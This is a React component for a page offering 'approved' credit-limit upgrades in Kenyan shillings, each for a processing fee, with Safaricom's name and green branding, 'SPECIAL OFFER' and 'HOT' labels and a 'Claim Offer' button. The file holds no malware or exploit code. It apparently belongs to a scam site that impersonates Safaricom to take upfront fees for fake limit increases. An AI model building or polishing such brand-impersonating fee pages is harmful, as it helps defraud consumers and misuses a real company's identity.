import React from "react";
import { useState, useEffect } from 'react';
import { LIMITS_DATA, SAFARICOM_GREEN } from '../utils/constants';

export default function LimitSelection({ onSelect, selectedLimit }) {
  const [activeCard, setActiveCard] = useState(null);

  const handleCardClick = (limit) => {
    setActiveCard(limit.amt);
    onSelect(limit.amt, limit.fee);
  };

  const handleHeroOfferClick = () => {
    const heroLimit = LIMITS_DATA.find(l => l.type === 'hero');
    if (heroLimit) {
      setActiveCard(heroLimit.amt);
      onSelect(heroLimit.amt, heroLimit.fee);
    }
  };

  // Scroll to top when component mounts
  useEffect(() => {
    window.scrollTo({ top: 0, behavior: 'smooth' });
  }, []);

  return (
    <div id="main-content" className="max-w-2xl mx-auto px-4 py-8">
      <h2
        className="text-2xl font-extrabold mb-5 text-left border-l-4 border-safaricom pl-3"
        style={{ borderColor: SAFARICOM_GREEN }}
      >
        Select Your New Approved Limit
      </h2>

      <div id="grid-container" className="grid grid-cols-2 gap-4 mb-8">
        {LIMITS_DATA.map((limit) => {
          if (limit.type === 'hero') {
            return (
              <div
                key={limit.amt}
                className="hero-offer cursor-pointer"
                onClick={handleHeroOfferClick}
              >
                <span className="offer-label">
                  <i className="fas fa-star mr-1" />
                  SPECIAL OFFER
                </span>

                <div className="offer-amt">
                  Ksh {limit.amt.toLocaleString()}
                </div>

                <div className="flex items-center justify-center gap-3 mt-3 flex-wrap">
                  <div className="hero-fee-pill">
                    Processing Fee: Ksh {limit.fee}
                  </div>

                  <button
                    onClick={(e) => {
                      e.stopPropagation();
                      handleHeroOfferClick();
                    }}
                    className="btn-hero"
                  >
                    Claim Offer
                  </button>
                </div>
              </div>
            );
          }

          return (
            <div
              key={limit.amt}
              onClick={() => handleCardClick(limit)}
              className={`limit-card ${activeCard === limit.amt ? 'active-card' : ''} limit-card-hover`}
              style={{
                borderColor: activeCard === limit.amt ? SAFARICOM_GREEN : '#e2e8f0',
                backgroundColor: activeCard === limit.amt ? '#f0fdf4' : 'white',
              }}
            >
              {/* Tags */}
              {limit.tags.includes('instant') && (
                <div className="tag-instant">
                  <i className="fas fa-bolt" /> Instant
                </div>
              )}
              {limit.tags.includes('hot') && (
                <div className="tag-hot">HOT</div>
              )}

              <p className="limit-amt">Ksh {limit.amt.toLocaleString()}</p>
              <p
                className="limit-fee"
                style={{ color: SAFARICOM_GREEN }}
              >
                Fee: Ksh {limit.fee}
              </p>
              <div className="arrow-icon">
                <i className="fas fa-chevron-right" />
              </div>
            </div>
          );
        })}
      </div>

      {selectedLimit && (
        <button
          id="main-upgrade-btn"
          onClick={() => {}}
          className="w-full bg-safaricom text-white font-bold py-5 rounded-2xl shadow-xl transition-all uppercase tracking-wider text-sm cursor-pointer hover:bg-green-700"
          style={{ backgroundColor: SAFARICOM_GREEN }}
        >
          Upgrade to Ksh {selectedLimit.toLocaleString()}
        </button>
      )}
    </div>
  );
}